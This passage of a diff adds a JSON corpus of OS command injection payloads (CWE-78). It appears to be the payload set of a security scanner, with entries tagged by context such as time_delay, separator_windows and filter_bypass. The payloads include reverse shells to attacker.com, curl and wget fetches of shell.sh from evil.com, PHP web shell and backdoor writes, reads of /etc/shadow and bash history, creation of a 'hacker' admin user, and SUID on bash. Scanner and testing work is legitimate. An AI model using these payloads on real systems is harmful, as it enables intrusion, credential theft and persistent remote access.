+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.8d252ad1c2",
+      "vector": "| uname -a",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.9063fde35a",
+      "vector": "; mount",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.919aaf093c",
+      "vector": "| ifconfig",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.94360e3394",
+      "vector": "& dir c:\\ /s /b",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.9475bd960c",
+      "vector": "& timeout 10",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.95253c0bb9",
+      "vector": "| curl http://evil.com/shell.sh",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.9cda147844",
+      "vector": "; crontab -l",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.9d49bcc58a",
+      "vector": "& set",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.9db750239b",
+      "vector": "| netstat -tulpn",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.9f66b59996",
+      "vector": "| pwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.a59f22319d",
+      "vector": "; ps aux",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.a6e65f2bf4",
+      "vector": "| chmod +x /tmp/shell.sh",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.a82ab998bb",
+      "vector": "; ls -la",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.aa79d70e2d",
+      "vector": "& ifconfig",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.ab5e762173",
+      "vector": "; perl -e 'exec \"/bin/sh\";'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.abe4ec7f2d",
+      "vector": "; dir",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.ac4d6ea663",
+      "vector": "; echo \"<?php system($_GET['cmd']); ?>\" > shell.php",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.aec9bd9f59",
+      "vector": "; netstat -an",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.af6e32646c",
+      "vector": "& ps aux",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.b0a966ac7d",
+      "vector": "& ping -n 10 127.0.0.1",
+      "description": "Imported from the legacy corpus (time_delay).",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "command_injection.legacy.b2dd4c5a14",
+      "vector": "| find / -name \"config.php\" 2>/dev/null",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.b32cd972c1",
+      "vector": "| cat /etc/group",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.b3496b6d48",
+      "vector": "& query user",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.b385033df7",
+      "vector": "`ls`",
+      "description": "Imported from the legacy corpus (substitution).",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.b59afff460",
+      "vector": "; sleep 10",
+      "description": "Imported from the legacy corpus (time_delay).",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "command_injection.legacy.b70904255e",
+      "vector": "& fsutil fsinfo drives",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.b90e95ea9d",
+      "vector": "\r whoami",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.ba249ea8b0",
+      "vector": "| find / -name \"*.conf\" 2>/dev/null",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.bdc9151864",
+      "vector": "& uname -a",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.c37075fe84",
+      "vector": "| nc -e /bin/sh attacker.com 4444",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.c69367520e",
+      "vector": "`pwd`",
+      "description": "Imported from the legacy corpus (substitution).",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.c8f6e3aec9",
+      "vector": "; wget http://evil.com/shell.sh",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.c8ff41651e",
+      "vector": "; nc -e /bin/sh attacker.com 4444",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.ca5a058543",
+      "vector": "| cat /etc/resolv.conf",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.cb821d8f46",
+      "vector": "; tasklist",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.cd484bacde",
+      "vector": "& bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.ce34f8c98b",
+      "vector": "`cat /etc/passwd`",
+      "description": "Imported from the legacy corpus (substitution).",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.d0452c07e9",
+      "vector": "& net user hacker password /add",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.d0baad03a6",
+      "vector": "; lsof -i",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.d4a29ae1e4",
+      "vector": "& type c:\\windows\\system32\\drivers\\etc\\hosts",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.d516c03e8f",
+      "vector": "& cat /etc/shadow",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.d6c5f197e3",
+      "vector": "; ls /home",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.d70b2c413b",
+      "vector": "| dir",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.d7c0756e3e",
+      "vector": "| wget http://evil.com/shell.sh",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.d92aa93dac",
+      "vector": "| last",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.dae9f6ef62",
+      "vector": "%0d whoami",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.db1594a869",
+      "vector": "\n id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.dc624a41ae",
+      "vector": "; ls",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.dd227db320",
+      "vector": "| echo \"<?php phpinfo(); ?>\" > info.php",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.de8de983e7",
+      "vector": "& netstat -ano",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.e35f0163dc",
+      "vector": "; pwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.e3db14d6ac",
+      "vector": "; ls || id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "command_injection.legacy.e66a4754fd",
+      "vector": "| ls || id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "command_injection.legacy.e68f8d0503",
+      "vector": "; ls -la /tmp;",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy",
+        "source:master"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.e7cfab0bd4",
+      "vector": "%0a ls",
+      "description": "Imported from the legacy corpus (filter_bypass).",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.e9520d07dc",
+      "vector": "& %0|%0",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.ea186d13e0",
+      "vector": "| zip -r /tmp/backup.zip /var/www",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.ec28fa3f22",
+      "vector": "| ping -c 10 127.0.0.1",
+      "description": "Imported from the legacy corpus (time_delay).",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "command_injection.legacy.ec57297a27",
+      "vector": "; uname -a",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.edbfb5c152",
+      "vector": "& dir",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f00322c184",
+      "vector": "; env",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f110826db7",
+      "vector": "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f1139824a5",
+      "vector": "| cat ~/.bash_history",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f27672d050",
+      "vector": "& chmod 4755 /bin/bash",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f49b7cb559",
+      "vector": "& whoami",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f54343c3e8",
+      "vector": "& findstr /si password *.txt",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f904d629c9",
+      "vector": "; iptables -L",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f9a5377d6f",
+      "vector": "; curl http://evil.com/shell.sh",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.f9a8b04e53",
+      "vector": "; cat /etc/shadow",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.fa6efd94a7",
+      "vector": "; ls && id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.fb52c3c167",
+      "vector": "; cat /var/log/auth.log",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.fc6b89a69c",
+      "vector": "& echo \"<?php eval($_POST['code']); ?>\" > backdoor.php",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.fd04c10e14",
+      "vector": "\n ls",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.ff19c7eee1",
+      "vector": "$(sleep 10)",
+      "description": "Imported from the legacy corpus (time_delay).",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "command_injection.legacy.ffee135d71",
+      "vector": "; cat /etc/hosts",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    }
+  ]
+}
